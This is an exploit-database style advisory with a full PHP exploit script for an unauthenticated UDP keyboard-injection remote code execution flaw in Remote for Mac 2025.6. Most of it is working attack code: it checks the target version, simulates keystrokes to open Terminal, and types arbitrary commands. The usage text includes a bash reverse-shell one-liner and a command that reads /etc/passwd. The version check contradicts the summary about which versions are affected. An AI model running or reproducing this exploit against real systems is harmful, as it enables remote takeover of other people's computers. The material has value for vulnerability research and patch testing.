@@ -1,0 +1,288 @@
+=============================================================================================================================================
+| # Title     : Remote for Mac 2025.6 Unauthenticated UDP Keyboard RCE                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://remote-for-mac.macupdate.com                                                                                        |
+=============================================================================================================================================
+
+[+] Summary    : A remote code execution vulnerability exists in Remote for Mac version 2025.6. When the "Allow unknown devices" option is enabled, 
+                 the application accepts unauthenticated key input over UDP on port 1947. By sending a crafted sequence of UDP packets that simulate keyboard events, 
+                 an attacker can remotely open a Terminal window and execute arbitrary system commands as the current user.
+
+The flaw arises from the lack of authentication and insufficient validation of incoming UDP packets. The attacker can transmit UTF‑16LE encoded characters representing command input, 
+allowing full command execution without prior access or authentication.
+Successful exploitation results in full remote shell execution, allowing post‑exploitation actions such as arbitrary command execution, reverse shells, or privilege escalation attempts.
+The issue has been tested and confirmed reproducible against version 2025.6. Later versions (2025.7 and above) are not affected.
+
+POC : 
+
+# Test connection only
+
+php exploit.php 192.168.1.100 --test
+
+# Execute exploit with default command
+
+php exploit.php 192.168.1.100 --exploit
+
+# Execute exploit with custom command
+
+php exploit.php 192.168.1.100 --exploit --payload 'cat /etc/passwd'
+
+# With different HTTPS port
+
+php exploit.php 192.168.1.100 --exploit --port 8443 --payload 'whoami'
+
+====================
+<?php
+
+class RemoteMacExploit {
+    private $target;
+    private $port;
+    private $payload;
+    
+    public function __construct($target, $port = 80, $payload = 'id') {
+        $this->target = $target;
+        $this->port = $port;
+        $this->payload = $payload;
+    }
+    
+    public function check() {
+        $url = "https://{$this->target}:{$this->port}/api/getVersion";
+        
+        try {
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $url,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_TIMEOUT => 10
+            ]);
+            
+            $response = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($httpCode !== 200) {
+                return "Application might not be Remote For Mac";
+            }
+            
+            $json = json_decode($response, true);
+            
+            if (!isset($json['requires.auth'])) {
+                return "Could not determine authentication status";
+            }
+            
+            if ($json['requires.auth'] !== false && $json['requires.auth'] !== 'false') {
+                return "Remote For Mac detected, but authentication enabled";
+            }
+            
+            if (!isset($json['version'])) {
+                return "Could not determine target version";
+            }
+            
+            $version = $json['version'];
+            $targetVersion = $this->parseVersion($version);
+            $vulnerableVersion = $this->parseVersion('2025.7');
+            
+            if ($targetVersion <= $vulnerableVersion) {
+                return "VULNERABLE: Detected vulnerable version {$version} with authentication disabled";
+            }
+            
+            return "SAFE: Target version {$version} is not vulnerable";
+            
+        } catch (Exception $e) {
+            return "Error during check: " . $e->getMessage();
+        }
+    }
+    
+    public function exploit() {
+        $initialPacketsHex = [
+            '07000200370001',
+            '07000200370001',
+            '060003002000',
+            '07000200370000',
+            '07000200370000'
+        ];
+        
+        $finalPacketsHex = [
+            '07000200240001',
+            '07000200240000'
+        ];
+
+        $socket = $this->connectUDP();
+        if (!$socket) {
+            echo "[-] Failed to create UDP socket\n";
+            return false;
+        }
+        
+        echo "[+] Simulating system keyboard input to open Terminal...\n";
+
+        foreach ($initialPacketsHex as $hexPacket) {
+            $packet = hex2bin($hexPacket);
+            $this->sendUDP($socket, $packet);
+            usleep(50000); 
+        }
+
+        $prefix = hex2bin('06000300');
+        $word = 'terminal';
+        
+        for ($i = 0; $i < strlen($word); $i++) {
+            $char = $word[$i];
+            $utf16 = mb_convert_encoding($char, 'UTF-16LE', 'UTF-8');
+            $packet = $prefix . $utf16;
+            $this->sendUDP($socket, $packet);
+            usleep(100000); 
+        }
+
+        foreach ($finalPacketsHex as $hexPacket) {
+            $packet = hex2bin($hexPacket);
+            $this->sendUDP($socket, $packet);
+        }
+        
+        echo "[+] Initial sequence finished, waiting for terminal to be spawned...\n";
+        sleep(2);
+        
+        echo "[+] Sending malicious payload to be executed...\n";
+
+        for ($i = 0; $i < strlen($this->payload); $i++) {
+            $char = $this->payload[$i];
+            $utf16 = mb_convert_encoding($char, 'UTF-16LE', 'UTF-8');
+            $packet = $prefix . $utf16;
+            $this->sendUDP($socket, $packet);
+            usleep(100000); 
+        }
+
+        foreach ($finalPacketsHex as $hexPacket) {
+            $packet = hex2bin($hexPacket);
+            $this->sendUDP($socket, $packet);
+        }
+        
+        echo "[+] Payload sent\n";
+        $this->closeUDP($socket);
+        
+        return true;
+    }
+    
+    private function connectUDP() {
+        $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+        if (!$socket) {
+            echo "[-] Socket error: " . socket_strerror(socket_last_error()) . "\n";
+            return false;
+        }
+
+        return $socket;
+    }
+    
+    private function sendUDP($socket, $data) {
+
+        $result = socket_sendto($socket, $data, strlen($data), 0, $this->target, 1947);
+        if ($result === false) {
+            echo "[-] UDP send error: " . socket_strerror(socket_last_error($socket)) . "\n";
+            return false;
+        }
+        return $result;
+    }
+    
+    private function closeUDP($socket) {
+        socket_close($socket);
+    }
+    
+    private function parseVersion($versionString) {
+        $parts = explode('.', $versionString);
+        $major = isset($parts[0]) ? (int)$parts[0] : 0;
+        $minor = isset($parts[1]) ? (int)$parts[1] : 0;
+        $patch = isset($parts[2]) ? (int)$parts[2] : 0;
+        
+        return $major * 10000 + $minor * 100 + $patch;
+    }
+
+    public function test() {
+        echo "[*] Testing connection to {$this->target}...\n";
+        echo "[*] Checking HTTP API...\n";
+        $checkResult = $this->check();
+        echo "[*] Check result: {$checkResult}\n";
+        echo "[*] Testing UDP connectivity to port 1947...\n";
+        $socket = $this->connectUDP();
+        if ($socket) {
+            echo "[+] UDP socket created successfully\n";
+
+            $testPacket = hex2bin('07000200370001');
+            $result = $this->sendUDP($socket, $testPacket);
+            if ($result !== false) {
+                echo "[+] UDP test packet sent successfully\n";
+            } else {
+                echo "[-] Failed to send UDP packet\n";
+            }
+            
+            $this->closeUDP($socket);
+        } else {
+            echo "[-] Failed to create UDP socket\n";
+        }
+    }
+}
+
+if (php_sapi_name() === 'cli') {
+    if ($argc < 2) {
+        echo "Remote for Mac 2025.6 Unauthenticated RCE Exploit (PHP)\n";
+        echo "                   By Indoushka                       \n";
+        echo "=====================================================\n";
+        echo "Usage: php exploit.php <target_ip> [options]\n";
+        echo "\n";
+        echo "Options:\n";
+        echo "  <target_ip>          Target IP address\n";
+        echo "  --port <port>        HTTPS port (default: 443)\n";
+        echo "  --payload <cmd>      Command to execute (default: 'id')\n";
+        echo "  --test               Test connectivity only\n";
+        echo "  --exploit            Run full exploit\n";
+        echo "\n";
+        echo "Examples:\n";
+        echo "  php exploit.php 192.168.1.100 --test\n";
+        echo "  php exploit.php 192.168.1.100 --exploit --payload 'whoami'\n";
+        echo "  php exploit.php 192.168.1.100 --exploit --port 8443 --payload 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'\n";
+        exit(1);
+    }
+    
+    $target = $argv[1];
+    $port = 443; 
+    $payload = 'id';
+    $action = 'test'; 
+
+    for ($i = 2; $i < $argc; $i++) {
+        if ($argv[$i] === '--port' && isset($argv[$i + 1])) {
+            $port = $argv[$i + 1];
+            $i++;
+        } elseif ($argv[$i] === '--payload' && isset($argv[$i + 1])) {
+            $payload = $argv[$i + 1];
+            $i++;
+        } elseif ($argv[$i] === '--test') {
+            $action = 'test';
+        } elseif ($argv[$i] === '--exploit') {
+            $action = 'exploit';
+        }
+    }
+    
+    $exploit = new RemoteMacExploit($target, $port, $payload);
+    
+    if ($action === 'test') {
+        $exploit->test();
+    } elseif ($action === 'exploit') {
+        echo "[*] Checking target...\n";
+        $result = $exploit->check();
+        echo "[*] Check result: {$result}\n";
+        
+        if (strpos($result, 'VULNERABLE') !== false) {
+            echo "[*] Attempting exploitation...\n";
+            $success = $exploit->exploit();
+            echo $success ? "[+] Exploitation completed\n" : "[-] Exploitation failed\n";
+        } else {
+            echo "[-] Target is not vulnerable, skipping exploitation\n";
+        }
+    }
+}
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
